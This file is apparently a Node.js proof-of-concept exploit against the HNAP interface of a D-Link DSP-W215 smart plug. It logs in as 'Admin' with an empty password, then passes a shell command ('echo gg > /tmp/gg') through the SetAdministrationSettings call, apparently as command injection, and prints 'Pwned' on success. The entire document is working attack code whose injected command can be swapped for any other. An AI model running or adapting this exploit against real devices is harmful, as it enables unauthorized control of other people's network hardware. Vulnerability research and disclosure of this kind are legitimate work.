/**
 * Credits: https://github.com/bikerp/dsp-w215-hnap
 */
var soapclient = require('./js/soapclient');

var LOGIN_USER = "Admin";
var LOGIN_PWD = "";
var HNAP_URL = "http://purenetworks.com/HNAP1/";

console.log("[+] Logging in")
soapclient.login(LOGIN_USER, LOGIN_PWD, HNAP_URL).done(function (status) {
    if (!status) {
        throw "[X] Login failed!";
    }
    if (status != "success") {
        throw "[X] Login failed!";
    }
    console.log("[+] Logged in")
    administration_poc("echo gg > /tmp/gg")
});

function administration_poc(cmd){
    soapclient.SetAdministrationSettings(cmd).done(function (result){
        console.log("[+] Pwned");
    })
};